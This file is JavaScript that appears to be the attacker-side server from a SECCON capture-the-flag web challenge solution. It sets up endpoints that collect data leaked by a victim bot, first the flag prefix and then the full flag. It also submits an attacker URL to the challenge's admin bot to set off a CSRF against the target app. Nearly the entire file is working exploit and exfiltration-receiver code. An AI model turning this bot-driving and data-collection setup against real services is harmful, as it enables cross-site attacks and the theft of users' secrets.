const fastify = require("fastify")();
const path = require("node:path");

const fail = (message) => {
  console.error(message);
  return process.exit(1);
};

const WEB_BASE_URL = process.env.WEB_BASE_URL ?? fail("No WEB_BASE_URL");
const BOT_BASE_URL = process.env.BOT_BASE_URL ?? fail("No BOT_BASE_URL");
const ATTACKER_BASE_URL =
  process.env.ATTACKER_BASE_URL ?? fail("No ATTACKER_BASE_URL");
const PORT = "8080";

if (!ATTACKER_BASE_URL.startsWith("http://")) {
  fail("Invalid ATTACKER_BASE_URL: the CSRF will fail");
}

const sleep = (msec) => new Promise((resolve) => setTimeout(resolve, msec));

const reportUrl = (url) =>
  fetch(`${BOT_BASE_URL}/api/report`, {
    method: "POST",
    headers: {
      "Content-Type": "application/json",
    },
    body: JSON.stringify({ url }),
  }).then((r) => r.text());

const start = async () => {
  let sharedUrl;

  fastify.register(require("@fastify/static"), {
    root: path.join(__dirname, "public"),
  });

  fastify.get("/set-referer", async (req, reply) => {
    const url = new URL(req.headers["referer"]);
    sharedUrl = `${WEB_BASE_URL}${url.pathname}`;
    return "";
  });

  fastify.get("/get-note-ids", async (req, reply) => {
    while (!sharedUrl) {
      await sleep(30);
    }
    const html = await fetch(sharedUrl).then((r) => r.text());
    sharedUrl = undefined;

    const ids = [...html.matchAll(/"\/notes\/delete\/(?<id>[0-9a-f]+)"/g)].map(
      (m) => m.groups["id"]
    );
    return ids;
  });

  let known = "SECCON{";

  fastify.post("/leaked", async (req, reply) => {
    known = req.body.trim();
    console.log(known);
    return "";
  });

  fastify.post("/flag", async (req, reply) => {
    // You got a flag!
    console.log("Flag:", req.body);
    process.exit(0);
  });

  fastify.listen({ port: PORT, host: "0.0.0.0" }, async (err, address) => {
    if (err) fail(err.toString());

    await sleep(3 * 1000);
    for (let i = 0; i < 2; i++) {
      console.log(`Report ${i + 1}:`);
      await reportUrl(
        `${ATTACKER_BASE_URL}?${new URLSearchParams({
          baseUrl: "http://web:3000",
          known,
        })}`
      );
    }

    fail("Failed");
  });
};
start();
